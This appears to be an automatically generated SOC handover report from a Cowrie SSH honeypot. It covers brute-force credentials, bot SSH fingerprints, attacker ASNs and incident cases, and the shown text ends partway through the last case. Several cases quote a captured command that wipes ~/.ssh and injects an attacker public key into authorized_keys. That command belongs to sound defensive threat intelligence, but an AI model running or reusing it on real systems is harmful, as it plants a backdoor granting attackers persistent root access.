# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-18 |
| **Generated At** | 2026-06-18T22:14:35Z |
| **Shift Time** | 22:14 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **206** |
| Confirmed Threats | **140** |
| False Positives Filtered | **66** (32.0%) |
| Unique Attacker IPs | **46** |
| Countries of Origin | **20** |
| High Severity Cases | **17** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **189** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **99** |
| Unique Credential Pairs | **55** |
| Unique Usernames | **41** |
| Unique Passwords | **38** |
| Successful Auth Pairs | **15** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 17 |
| `User-Agent: Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)` | 16 |
| `Accept-Encoding: gzip` | 16 |
| `345gs5662d34` | 7 |
| `GET / HTTP/1.0` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `` | 20 |
| `Host: 13.235.92.17:2223` | 16 |
| `Accept: */*` | 16 |
| `345gs5662d34` | 7 |
| `3245gs5662d34` | 7 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `User-Agent: Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)` | `Accept: */*` | 16 |
| `Accept-Encoding: gzip` | `` | 16 |
| `345gs5662d34` | `345gs5662d34` | 7 |
| `root` | `3245gs5662d34` | 7 |
| `GET / HTTP/1.0` | `` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `admin` | `171.231.177.174` | 2026-06-18T19:32:52 |
| `root` | `123@123aA` | `103.217.145.41` | 2026-06-18T19:55:50 |
| `root` | `3245gs5662d34` | `103.217.145.41` | 2026-06-18T19:55:55 |
| `root` | `Ly123456@` | `103.217.145.41` | 2026-06-18T19:57:13 |
| `root` | `Alpha123` | `103.217.145.41` | 2026-06-18T19:57:39 |
| `root` | `Admin2024!@#` | `160.191.244.158` | 2026-06-18T20:02:11 |
| `root` | `3245gs5662d34` | `160.191.244.158` | 2026-06-18T20:02:14 |
| `root` | `....` | `121.224.78.164` | 2026-06-18T20:02:21 |
| `root` | `3245gs5662d34` | `121.224.78.164` | 2026-06-18T20:02:25 |
| `root` | `welcome2026` | `165.154.12.108` | 2026-06-18T20:02:34 |
| `root` | `3245gs5662d34` | `165.154.12.108` | 2026-06-18T20:02:36 |
| `root` | `P@$$W0rd` | `183.91.186.36` | 2026-06-18T20:02:37 |
| `root` | `3245gs5662d34` | `183.91.186.36` | 2026-06-18T20:02:41 |
| `root` | `root33` | `218.4.156.254` | 2026-06-18T20:45:54 |
| `root` | `qwer12` | `183.89.208.174` | 2026-06-18T21:54:35 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **206** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 41 |
| OpenSSH | 9 |
| AsyncSSH (Python) | 6 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 31 | 8 |
| `acaa53e0a7d7...` | Mirai/variant | 9 | 9 |
| `fda360b1b4f4...` | Mirai/variant | 6 | 1 |
| `03a80b21afa8...` | Modern SSH client | 3 | 1 |
| `f45fb203c310...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 31 | 8 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 9 | 9 | Mirai/variant |
| `95420f9d932d...` | libssh | 6 | 3 | — |
| `fda360b1b4f4...` | AsyncSSH (Python) | 6 | 1 | Mirai/variant |
| `03a80b21afa8...` | libssh | 3 | 1 | Modern SSH client |
| `f45fb203c310...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 7 | 5 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `103.217.145.41`, `183.91.186.36`, `121.224.78.164`, `160.191.244.158`, `165.154.12.108`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **46** |
| Unique ASNs | **34** |
| High-Risk ASNs | **28** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 4 | MEDIUM |
| `AS396982` | Google LLC | 4 | LOW |
| `AS14061` | DigitalOcean, LLC | 3 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 1 | HIGH |
| `AS199739` | Earthlink Telecommunications Equipment Trading & Services DMCC | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (17)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-7f862d15ff2a

| Field | Detail |
|---|---|
| **Source IP** | `171.231.177[.]174` |
| **First Seen** | 2026-06-18 19:32 |
| **Last Seen** | 2026-06-18 19:33 |
| **Session Duration** | 69s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-18 19:32:19` | `cowrie.session.connect` |
| `2026-06-18 19:32:20` | `cowrie.client.version` |
| `2026-06-18 19:32:22` | `cowrie.client.kex` |
| `2026-06-18 19:32:52` | `cowrie.login.success` |
| `2026-06-18 19:33:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.231.177[.]174` to AbuseIPDB if not already reported
- [ ] Block `171.231.177[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d89259c1bc38

| Field | Detail |
|---|---|
| **Source IP** | `103.217.145[.]41` |
| **First Seen** | 2026-06-18 19:55 |
| **Last Seen** | 2026-06-18 19:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-18 19:55:49` | `cowrie.session.connect` |
| `2026-06-18 19:55:49` | `cowrie.client.version` |
| `2026-06-18 19:55:50` | `cowrie.client.kex` |
| `2026-06-18 19:55:50` | `cowrie.login.success` |
| `2026-06-18 19:55:51` | `cowrie.session.params` |
| `2026-06-18 19:55:51` | `cowrie.command.input` |
| `2026-06-18 19:55:51` | `cowrie.command.failed` |
| `2026-06-18 19:55:51` | `cowrie.log.closed` |
| `2026-06-18 19:55:51` | `cowrie.session.params` |
| `2026-06-18 19:55:51` | `cowrie.command.input` |
| `2026-06-18 19:55:52` | `cowrie.session.file_download` |
| `2026-06-18 19:55:52` | `cowrie.log.closed` |
| `2026-06-18 19:55:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.217.145[.]41` to AbuseIPDB if not already reported
- [ ] Block `103.217.145[.]41` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0598ed4df93e

| Field | Detail |
|---|---|
| **Source IP** | `103.217.145[.]41` |
| **First Seen** | 2026-06-18 19:55 |
| **Last Seen** | 2026-06-18 19:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-18 19:55:54` | `cowrie.session.connect` |
| `2026-06-18 19:55:54` | `cowrie.client.version` |
| `2026-06-18 19:55:54` | `cowrie.client.kex` |
| `2026-06-18 19:55:55` | `cowrie.login.success` |
| `2026-06-18 19:55:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.217.145[.]41` to AbuseIPDB if not already reported
- [ ] Block `103.217.145[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a98f891a93f

| Field | Detail |
|---|---|
| **Source IP** | `103.217.145[.]41` |
| **First Seen** | 2026-06-18 19:57 |
| **Last Seen** | 2026-06-18 19:57 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-18 19:57:12` | `cowrie.session.connect` |
| `2026-06-18 19:57:12` | `cowrie.client.version` |
| `2026-06-18 19:57:12` | `cowrie.client.kex` |
| `2026-06-18 19:57:13` | `cowrie.login.success` |
| `2026-06-18 19:57:13` | `cowrie.session.params` |
| `2026-06-18 19:57:13` | `cowrie.command.input` |
| `2026-06-18 19:57:13` | `cowrie.command.failed` |
| `2026-06-18 19:57:14` | `cowrie.log.closed` |
| `2026-06-18 19:57:14` | `cowrie.session.params` |
| `2026-06-18 19:57:14` | `cowrie.command.input` |
| `2026-06-18 19:57:14` | `cowrie.session.file_download` |
| `2026-06-18 19:57:14` | `cowrie.log.closed` |
| `2026-06-18 19:57:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.217.145[.]41` to AbuseIPDB if not already reported
- [ ] Block `103.217.145[.]41` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8987ac9be9c6

| Field | Detail |
|---|---|
| **Source IP** | `103.217.145[.]41` |
| **First Seen** | 2026-06-18 19:57 |
| **Last Seen** | 2026-06-18 19:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-18 19:57:17` | `cowrie.session.connect` |
| `2026-06-18 19:57:17` | `cowrie.client.version` |
| `2026-06-18 19:57:17` | `cowrie.client.kex` |
| `2026-06-18 19:57:18` | `cowrie.login.success` |
| `2026-06-18 19:57:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.217.145[.]41` to AbuseIPDB if not already reported
- [ ] Block `103.217.145[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15f48773846e

| Field | Detail |
|---|---|
| **Source IP** | `103.217.145[.]41` |
| **First Seen** | 2026-06-18 19:57 |
| **Last Seen** | 2026-06-18 19:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-18 19:57:38` | `cowrie.session.connect` |
| `2026-06-18 19:57:38` | `cowrie.client.version` |
| `2026-06-18 19:57:38` | `cowrie.client.kex` |
| `2026-06-18 19:57:39` | `cowrie.login.success` |
| `2026-06-18 19:57:39` | `cowrie.session.params` |
| `2026-06-18 19:57:39` | `cowrie.command.input` |
| `2026-06-18 19:57:39` | `cowrie.command.failed` |
| `2026-06-18 19:57:40` | `cowrie.log.closed` |
| `2026-06-18 19:57:40` | `cowrie.session.params` |
| `2026-06-18 19:57:40` | `cowrie.command.input` |
| `2026-06-18 19:57:40` | `cowrie.session.file_download` |
| `2026-06-18 19:57:40` | `cowrie.log.closed` |
| `2026-06-18 19:57:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.217.145[.]41` to AbuseIPDB if not already reported
- [ ] Block `103.217.145[.]41` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b47f6397560

| Field | Detail |
|---|---|
| **Source IP** | `103.217.145[.]41` |
| **First Seen** | 2026-06-18 19:57 |
| **Last Seen** | 2026-06-18 19:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-18 19:57:43` | `cowrie.session.connect` |
| `2026-06-18 19:57:43` | `cowrie.client.version` |
| `2026-06-18 19:57:43` | `cowrie.client.kex` |
| `2026-06-18 19:57:44` | `cowrie.login.success` |
| `2026-06-18 19:57:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.217.145[.]41` to AbuseIPDB if not already reported
- [ ] Block `103.217.145[.]41` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b69befce5ad

| Field | Detail |
|---|---|
| **Source IP** | `160.191.244[.]158` |
| **First Seen** | 2026-06-18 20:02 |
| **Last Seen** | 2026-06-18 20:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-18 20:02:10` | `cowrie.session.connect` |
| `2026-06-18 20:02:10` | `cowrie.client.version` |
| `2026-06-18 20:02:10` | `cowrie.client.kex` |
| `2026-06-18 20:02:11` | `cowrie.login.success` |
| `2026-06-18 20:02:11` | `cowrie.session.params` |
| `2026-06-18 20:02:11` | `cowrie.command.input` |
| `2026-06-18 20:02:11` | `cowrie.command.failed` |
| `2026-06-18 20:02:11` | `cowrie.log.closed` |
| `2026-06-18 20:02:11` | `cowrie.session.params` |
| `2026-06-18 20:02:11` | `cowrie.command.input` |
| `2026-06-18 20:02:11` | `cowrie.session.file_download` |
| `2026-06-18 20:02:11` | `cowrie.log.closed` |
| `2026-06-18 20:02:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.191.244[.]158` to AbuseIPDB if not already reported
- [ ] Block `160.191.244[.]158` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-220c086d97d9

| Field | Detail |
|---|---|
| **Source IP** | `160.191.244[.]158` |
| **First Seen** | 2026-06-18 20:02 |
| **Last Seen** | 2026-06-18 20:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-18 20:02:13` | `cowrie.session.connect` |
| `2026-06-18 20:02:13` | `cowrie.client.version` |
| `2026-06-18 20:02:13` | `cowrie.client.kex` |
| `2026-06-18 20:02:14` | `cowrie.login.success` |
| `2026-06-18 20:02:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.191.244[.]158` to AbuseIPDB if not already reported
- [ ] Block `160.191.244[.]158` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-436b9b99ae58

| Field | Detail |
|---|---|
| **Source IP** | `121.224.78[.]164` |
| **First Seen** | 2026-06-18 20:02 |
| **Last Seen** | 2026-06-18 20:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-18 20:02:20` | `cowrie.session.connect` |
| `2026-06-18 20:02:20` | `cowrie.client.version` |
| `2026-06-18 20:02:20` | `cowrie.client.kex` |
| `2026-06-18 20:02:21` | `cowrie.login.success` |
| `2026-06-18 20:02:21` | `cowrie.session.params` |
| `2026-06-18 20:02:21` | `cowrie.command.input` |
| `2026-06-18 20:02:21` | `cowrie.command.failed` |
| `2026-06-18 20:02:21` | `cowrie.log.closed` |
| `2026-06-18 20:02:22` | `cowrie.session.params` |
| `2026-06-18 20:02:22` | `cowrie.command.input` |
| `2026-06-18 20:02:22` | `cowrie.session.file_download` |
| `2026-06-18 20:02:22` | `cowrie.log.closed` |
| `2026-06-18 20:02:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.224.78[.]164` to AbuseIPDB if not already reported
- [ ] Block `121.224.78[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3ddeaddacae

| Field | Detail |
|---|---|
| **Source IP** | `121.224.78[.]164` |
| **First Seen** | 2026-06-18 20:02 |
| **Last Seen** | 2026-06-18 20:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-18 20:02:24` | `cowrie.session.connect` |
| `2026-06-18 20:02:24` | `cowrie.client.version` |
| `2026-06-18 20:02:24` | `cowrie.client.kex` |
| `2026-06-18 20:02:25` | `cowrie.login.success` |
| `2026-06-18 20:02:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.224.78[.]164` to AbuseIPDB if not already reported
- [ ] Block `121.224.78[.]164` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1508f36b96f8

| Field | Detail |
|---|---|
| **Source IP** | `165.154.12[.]108` |
| **First Seen** | 2026-06-18 20:02 |
| **Last Seen** | 2026-06-18 20:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-18 20:02:34` | `cowrie.session.connect` |
| `2026-06-18 20:02:34` | `cowrie.client.version` |
| `2026-06-18 20:02:34` | `cowrie.client.kex` |
| `2026-06-18 20:02:34` | `cowrie.login.success` |
| `2026-06-18 20:02:34` | `cowrie.session.params` |
| `2026-06-18 20:02:34` | `cowrie.command.input` |
| `2026-06-18 20:02:34` | `cowrie.command.failed` |
| `2026-06-18 20:02:34` | `cowrie.log.closed` |
| `2026-06-18 20:02:35` | `cowrie.session.params` |
| `2026-06-18 20:02:35` | `cowrie.command.input` |
| `2026-06-18 20:02:35` | `cowrie.session.file_download` |
| `2026-06-18 20:02:35` | `cowrie.log.closed` |
| `2026-06-18 20:02:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.12[.]108` to AbuseIPDB if not already reported
- [ ] Block `165.154.12[.]108` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6559a6437350

| Field | Detail |
|---|---|
| **Source IP** | `165.154.12[.]108` |
| **First Seen** | 2026-06-18 20:02 |
| **Last Seen** | 2026-06-18 20:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-18 20:02:36` | `cowrie.session.connect` |
| `2026-06-18 20:02:36` | `cowrie.client.version` |
| `2026-06-18 20:02:36` | `cowrie.client.kex` |
| `2026-06-18 20:02:36` | `cowrie.login.success` |
| `2026-06-18 20:02:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.12[.]108` to AbuseIPDB if not already reported
- [ ] Block `165.154.12[.]108` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a2520eb17ed

| Field | Detail |
|---|---|
| **Source IP** | `183.91.186[.]36` |
| **First Seen** | 2026-06-18 20:02 |
| **Last Seen** | 2026-06-18 20:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
